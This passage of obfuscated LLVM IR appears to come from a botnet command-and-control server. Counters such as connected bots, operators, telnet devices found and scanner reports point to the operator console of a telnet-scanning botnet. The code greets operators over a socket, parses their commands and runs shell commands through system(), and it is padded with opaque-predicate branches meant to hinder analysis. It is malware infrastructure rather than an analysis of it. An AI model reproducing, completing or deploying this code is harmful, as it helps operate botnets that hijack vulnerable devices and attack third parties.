  %336 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %337 = call i64 @strlen(i8* %336) #8
  %338 = call i64 @send(i32 %334, i8* %335, i64 %337, i32 16384)
  %339 = icmp eq i64 %338, -1
  %340 = load i32, i32* @x.15
  %341 = load i32, i32* @y.16
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %339, label %348, label %349

; <label>:348:                                    ; preds = %originalBBpart250
  br label %1940

; <label>:349:                                    ; preds = %originalBBpart250
  %350 = load i32, i32* @x.15
  %351 = load i32, i32* @y.16
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %349
  %358 = call i32 @sleep(i32 5)
  %359 = load i32, i32* @x.15
  %360 = load i32, i32* @y.16
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %1940

; <label>:367:                                    ; preds = %originalBBpart246
  %368 = load i8*, i8** %3, align 8
  %369 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %368) #7
  %370 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %370, i8 0, i64 2048, i32 16, i1 false)
  %371 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %372 = call i32 (i8*, i8*, ...) @sprintf(i8* %371, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.26, i32 0, i32 0)) #7
  %373 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %374 = call i32 (i8*, i8*, ...) @sprintf(i8* %373, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.27, i32 0, i32 0)) #7
  %375 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %376 = call i32 (i8*, i8*, ...) @sprintf(i8* %375, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.28, i32 0, i32 0)) #7
  %377 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %378 = call i32 (i8*, i8*, ...) @sprintf(i8* %377, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.29, i32 0, i32 0)) #7
  %379 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %380 = call i32 (i8*, i8*, ...) @sprintf(i8* %379, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.30, i32 0, i32 0)) #7
  %381 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %382 = call i32 (i8*, i8*, ...) @sprintf(i8* %381, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.31, i32 0, i32 0)) #7
  %383 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %384 = call i32 (i8*, i8*, ...) @sprintf(i8* %383, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.32, i32 0, i32 0)) #7
  %385 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %386 = load i32, i32* %5, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %387
  %389 = getelementptr inbounds %struct.login_info, %struct.login_info* %388, i32 0, i32 0
  %390 = getelementptr inbounds [20 x i8], [20 x i8]* %389, i32 0, i32 0
  %391 = call i32 (i8*, i8*, ...) @sprintf(i8* %385, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.33, i32 0, i32 0), i8* %390) #7
  %392 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %393 = call i32 @BotsConnected()
  %394 = load volatile i32, i32* @OperatorsConnected, align 4
  %395 = call i32 (i8*, i8*, ...) @sprintf(i8* %392, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.34, i32 0, i32 0), i32 %393, i32 %394) #7
  %396 = load i32, i32* %4, align 4
  %397 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %398 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %399 = call i64 @strlen(i8* %398) #8
  %400 = call i64 @send(i32 %396, i8* %397, i64 %399, i32 16384)
  %401 = icmp eq i64 %400, -1
  br i1 %401, label %402, label %403

; <label>:402:                                    ; preds = %367
  br label %1940

; <label>:403:                                    ; preds = %367
  %404 = load i32, i32* %4, align 4
  %405 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %406 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %407 = call i64 @strlen(i8* %406) #8
  %408 = call i64 @send(i32 %404, i8* %405, i64 %407, i32 16384)
  %409 = icmp eq i64 %408, -1
  br i1 %409, label %410, label %427

; <label>:410:                                    ; preds = %403
  %411 = load i32, i32* @x.15
  %412 = load i32, i32* @y.16
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %410
  %419 = load i32, i32* @x.15
  %420 = load i32, i32* @y.16
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %1940

; <label>:427:                                    ; preds = %403
  %428 = load i32, i32* %4, align 4
  %429 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %430 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %431 = call i64 @strlen(i8* %430) #8
  %432 = call i64 @send(i32 %428, i8* %429, i64 %431, i32 16384)
  %433 = icmp eq i64 %432, -1
  br i1 %433, label %434, label %435

; <label>:434:                                    ; preds = %427
  br label %1940

; <label>:435:                                    ; preds = %427
  %436 = load i32, i32* %4, align 4
  %437 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %438 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %439 = call i64 @strlen(i8* %438) #8
  %440 = call i64 @send(i32 %436, i8* %437, i64 %439, i32 16384)
  %441 = icmp eq i64 %440, -1
  br i1 %441, label %442, label %443

; <label>:442:                                    ; preds = %435
  br label %1940

; <label>:443:                                    ; preds = %435
  %444 = load i32, i32* %4, align 4
  %445 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %446 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %447 = call i64 @strlen(i8* %446) #8
  %448 = call i64 @send(i32 %444, i8* %445, i64 %447, i32 16384)
  %449 = icmp eq i64 %448, -1
  br i1 %449, label %450, label %451

; <label>:450:                                    ; preds = %443
  br label %1940

; <label>:451:                                    ; preds = %443
  %452 = load i32, i32* @x.15
  %453 = load i32, i32* @y.16
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %451
  %460 = load i32, i32* %4, align 4
  %461 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %462 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %463 = call i64 @strlen(i8* %462) #8
  %464 = call i64 @send(i32 %460, i8* %461, i64 %463, i32 16384)
  %465 = icmp eq i64 %464, -1
  %466 = load i32, i32* @x.15
  %467 = load i32, i32* @y.16
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %465, label %474, label %475

; <label>:474:                                    ; preds = %originalBBpart262
  br label %1940

; <label>:475:                                    ; preds = %originalBBpart262
  %476 = load i32, i32* %4, align 4
  %477 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %478 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %479 = call i64 @strlen(i8* %478) #8
  %480 = call i64 @send(i32 %476, i8* %477, i64 %479, i32 16384)
  %481 = icmp eq i64 %480, -1
  br i1 %481, label %482, label %483

; <label>:482:                                    ; preds = %475
  br label %1940

; <label>:483:                                    ; preds = %475
  %484 = load i32, i32* %4, align 4
  %485 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %486 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %487 = call i64 @strlen(i8* %486) #8
  %488 = call i64 @send(i32 %484, i8* %485, i64 %487, i32 16384)
  %489 = icmp eq i64 %488, -1
  br i1 %489, label %490, label %491

; <label>:490:                                    ; preds = %483
  br label %1940

; <label>:491:                                    ; preds = %483
  %492 = load i32, i32* @x.15
  %493 = load i32, i32* @y.16
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %491
  %500 = load i32, i32* @x.15
  %501 = load i32, i32* @y.16
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %508

; <label>:508:                                    ; preds = %originalBBpart266
  %509 = load i32, i32* %4, align 4
  %510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %511 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %512 = call i64 @strlen(i8* %511) #8
  %513 = call i64 @send(i32 %509, i8* %510, i64 %512, i32 16384)
  %514 = icmp eq i64 %513, -1
  br i1 %514, label %515, label %516

; <label>:515:                                    ; preds = %508
  br label %1940

; <label>:516:                                    ; preds = %508
  %517 = load i32, i32* @x.15
  %518 = load i32, i32* @y.16
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %516
  %525 = load i32, i32* %4, align 4
  %526 = call i64 @send(i32 %525, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i32 0, i32 0), i64 12, i32 16384)
  %527 = icmp eq i64 %526, -1
  %528 = load i32, i32* @x.15
  %529 = load i32, i32* @y.16
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %527, label %536, label %537

; <label>:536:                                    ; preds = %originalBBpart270
  br label %1940

; <label>:537:                                    ; preds = %originalBBpart270
  %538 = load i32, i32* @x.15
  %539 = load i32, i32* @y.16
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %537
  %546 = load i32, i32* @x.15
  %547 = load i32, i32* @y.16
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %554

; <label>:554:                                    ; preds = %originalBBpart274
  %555 = load i8*, i8** %3, align 8
  %556 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %555) #7
  %557 = load i32, i32* %4, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %558
  %560 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %559, i32 0, i32 0
  store i32 1, i32* %560, align 4
  br label %561

; <label>:561:                                    ; preds = %originalBBpart2270, %originalBBpart2266, %1792, %1537, %originalBBpart2206, %originalBBpart2146, %967, %originalBBpart2134, %923, %originalBBpart2130, %originalBBpart2126, %857, %851, %845, %originalBBpart2118, %originalBBpart2114, %779, %757, %originalBBpart2102, %713, %708, %631, %582, %554
  %562 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %563 = load i32, i32* %4, align 4
  %564 = call i32 @fdgets(i8* %562, i32 2048, i32 %563)
  %565 = icmp sgt i32 %564, 0
  br i1 %565, label %566, label %1939

; <label>:566:                                    ; preds = %561
  %567 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %568 = call i8* @strstr(i8* %567, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #8
  %569 = icmp ne i8* %568, null
  br i1 %569, label %570, label %583

; <label>:570:                                    ; preds = %566
  %571 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %572 = call i32 @BotsConnected()
  %573 = load volatile i32, i32* @OperatorsConnected, align 4
  %574 = call i32 (i8*, i8*, ...) @sprintf(i8* %571, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i32 0, i32 0), i32 %572, i32 %573) #7
  %575 = load i32, i32* %4, align 4
  %576 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %577 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %578 = call i64 @strlen(i8* %577) #8
  %579 = call i64 @send(i32 %575, i8* %576, i64 %578, i32 16384)
  %580 = icmp eq i64 %579, -1
  br i1 %580, label %581, label %582

; <label>:581:                                    ; preds = %570
  store i8* null, i8** %2, align 8
  br label %1949

; <label>:582:                                    ; preds = %570
  br label %561

; <label>:583:                                    ; preds = %566
  %584 = load i32, i32* @x.15
  %585 = load i32, i32* @y.16
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %583
  %592 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %593 = call i8* @strstr(i8* %592, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0)) #8
  %594 = icmp ne i8* %593, null
  %595 = load i32, i32* @x.15
  %596 = load i32, i32* @y.16
  %597 = sub i32 %595, 1
  %598 = mul i32 %595, %597
  %599 = urem i32 %598, 2
  %600 = icmp eq i32 %599, 0
  %601 = icmp slt i32 %596, 10
  %602 = or i1 %600, %601
  br i1 %602, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %594, label %603, label %632

; <label>:603:                                    ; preds = %originalBBpart278
  %604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %605 = load volatile i32, i32* @TELFound, align 4
  %606 = load volatile i32, i32* @scannerreport, align 4
  %607 = call i32 (i8*, i8*, ...) @sprintf(i8* %604, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i32 0, i32 0), i32 %605, i32 %606) #7
  %608 = load i32, i32* %4, align 4
  %609 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %610 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %611 = call i64 @strlen(i8* %610) #8
  %612 = call i64 @send(i32 %608, i8* %609, i64 %611, i32 16384)
  %613 = icmp eq i64 %612, -1
  br i1 %613, label %614, label %631

; <label>:614:                                    ; preds = %603
  %615 = load i32, i32* @x.15
  %616 = load i32, i32* @y.16
  %617 = sub i32 %615, 1
  %618 = mul i32 %615, %617
  %619 = urem i32 %618, 2
  %620 = icmp eq i32 %619, 0
  %621 = icmp slt i32 %616, 10
  %622 = or i1 %620, %621
  br i1 %622, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %614
  store i8* null, i8** %2, align 8
  %623 = load i32, i32* @x.15
  %624 = load i32, i32* @y.16
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %1949

; <label>:631:                                    ; preds = %603
  br label %561

; <label>:632:                                    ; preds = %originalBBpart278
  %633 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %634 = call i8* @strstr(i8* %633, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0)) #8
  %635 = icmp ne i8* %634, null
  br i1 %635, label %636, label %709

; <label>:636:                                    ; preds = %632
  %637 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %638 = call i32 @BotsConnected()
  %639 = load volatile i32, i32* @OperatorsConnected, align 4
  %640 = call i32 (i8*, i8*, ...) @sprintf(i8* %637, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i32 0, i32 0), i32 %638, i32 %639) #7
  %641 = load i32, i32* %4, align 4
  %642 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %643 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %644 = call i64 @strlen(i8* %643) #8
  %645 = call i64 @send(i32 %641, i8* %642, i64 %644, i32 16384)
  %646 = icmp eq i64 %645, -1
  br i1 %646, label %647, label %664

; <label>:647:                                    ; preds = %636
  %648 = load i32, i32* @x.15
  %649 = load i32, i32* @y.16
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %647
  store i8* null, i8** %2, align 8
  %656 = load i32, i32* @x.15
  %657 = load i32, i32* @y.16
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %1949

; <label>:664:                                    ; preds = %636
  %665 = load i32, i32* @x.15
  %666 = load i32, i32* @y.16
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %664
  %673 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %674 = load volatile i32, i32* @TELFound, align 4
  %675 = load volatile i32, i32* @scannerreport, align 4
  %676 = call i32 (i8*, i8*, ...) @sprintf(i8* %673, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i32 0, i32 0), i32 %674, i32 %675) #7
  %677 = load i32, i32* %4, align 4
  %678 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %679 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %680 = call i64 @strlen(i8* %679) #8
  %681 = call i64 @send(i32 %677, i8* %678, i64 %680, i32 16384)
  %682 = icmp eq i64 %681, -1
  %683 = load i32, i32* @x.15
  %684 = load i32, i32* @y.16
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %682, label %691, label %708

; <label>:691:                                    ; preds = %originalBBpart290
  %692 = load i32, i32* @x.15
  %693 = load i32, i32* @y.16
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %691
  store i8* null, i8** %2, align 8
  %700 = load i32, i32* @x.15
  %701 = load i32, i32* @y.16
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %1949

; <label>:708:                                    ; preds = %originalBBpart290
  br label %561

; <label>:709:                                    ; preds = %632
  %710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %711 = call i8* @strstr(i8* %710, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0)) #8
  %712 = icmp ne i8* %711, null
  br i1 %712, label %713, label %715

; <label>:713:                                    ; preds = %709
  %714 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.42, i32 0, i32 0))
  br label %561

; <label>:715:                                    ; preds = %709
  %716 = load i32, i32* @x.15
  %717 = load i32, i32* @y.16
  %718 = sub i32 %716, 1
  %719 = mul i32 %716, %718
  %720 = urem i32 %719, 2
  %721 = icmp eq i32 %720, 0
  %722 = icmp slt i32 %717, 10
  %723 = or i1 %721, %722
  br i1 %723, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %715
  %724 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %725 = call i8* @strstr(i8* %724, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #8
  %726 = icmp ne i8* %725, null
  %727 = load i32, i32* @x.15
  %728 = load i32, i32* @y.16
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br i1 %726, label %735, label %753

; <label>:735:                                    ; preds = %originalBBpart298
  %736 = load i32, i32* @x.15
  %737 = load i32, i32* @y.16
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %735
  %744 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.44, i32 0, i32 0))
  %745 = load i32, i32* @x.15
  %746 = load i32, i32* @y.16
  %747 = sub i32 %745, 1
  %748 = mul i32 %745, %747
  %749 = urem i32 %748, 2
  %750 = icmp eq i32 %749, 0
  %751 = icmp slt i32 %746, 10
  %752 = or i1 %750, %751
  br i1 %752, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %561

; <label>:753:                                    ; preds = %originalBBpart298
  %754 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %755 = call i8* @strstr(i8* %754, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0)) #8
  %756 = icmp ne i8* %755, null
  br i1 %756, label %757, label %759

; <label>:757:                                    ; preds = %753
  %758 = call i32 @system(i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.46, i32 0, i32 0))
  br label %561

; <label>:759:                                    ; preds = %753
  %760 = load i32, i32* @x.15
  %761 = load i32, i32* @y.16
  %762 = sub i32 %760, 1
  %763 = mul i32 %760, %762
  %764 = urem i32 %763, 2
  %765 = icmp eq i32 %764, 0
  %766 = icmp slt i32 %761, 10
  %767 = or i1 %765, %766
  br i1 %767, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %759
  %768 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %769 = call i8* @strstr(i8* %768, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0)) #8
  %770 = icmp ne i8* %769, null
  %771 = load i32, i32* @x.15
  %772 = load i32, i32* @y.16
  %773 = sub i32 %771, 1
  %774 = mul i32 %771, %773
  %775 = urem i32 %774, 2
  %776 = icmp eq i32 %775, 0
  %777 = icmp slt i32 %772, 10
  %778 = or i1 %776, %777
  br i1 %778, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br i1 %770, label %779, label %781

; <label>:779:                                    ; preds = %originalBBpart2106
  %780 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.48, i32 0, i32 0))
  br label %561

; <label>:781:                                    ; preds = %originalBBpart2106
  %782 = load i32, i32* @x.15
  %783 = load i32, i32* @y.16
  %784 = sub i32 %782, 1
  %785 = mul i32 %782, %784
  %786 = urem i32 %785, 2
  %787 = icmp eq i32 %786, 0
  %788 = icmp slt i32 %783, 10
  %789 = or i1 %787, %788
  br i1 %789, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %781
  %790 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %791 = call i8* @strstr(i8* %790, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.49, i32 0, i32 0)) #8
  %792 = icmp ne i8* %791, null
  %793 = load i32, i32* @x.15
  %794 = load i32, i32* @y.16
  %795 = sub i32 %793, 1
  %796 = mul i32 %793, %795
  %797 = urem i32 %796, 2
  %798 = icmp eq i32 %797, 0
  %799 = icmp slt i32 %794, 10
  %800 = or i1 %798, %799
  br i1 %800, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %792, label %801, label %819

; <label>:801:                                    ; preds = %originalBBpart2110
  %802 = load i32, i32* @x.15
  %803 = load i32, i32* @y.16
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %801
  %810 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.50, i32 0, i32 0))
  %811 = load i32, i32* @x.15
  %812 = load i32, i32* @y.16
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %561

; <label>:819:                                    ; preds = %originalBBpart2110
  %820 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %821 = call i8* @strstr(i8* %820, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.51, i32 0, i32 0)) #8
  %822 = icmp ne i8* %821, null
  br i1 %822, label %823, label %841

; <label>:823:                                    ; preds = %819
  %824 = load i32, i32* @x.15
  %825 = load i32, i32* @y.16
  %826 = sub i32 %824, 1
  %827 = mul i32 %824, %826
  %828 = urem i32 %827, 2
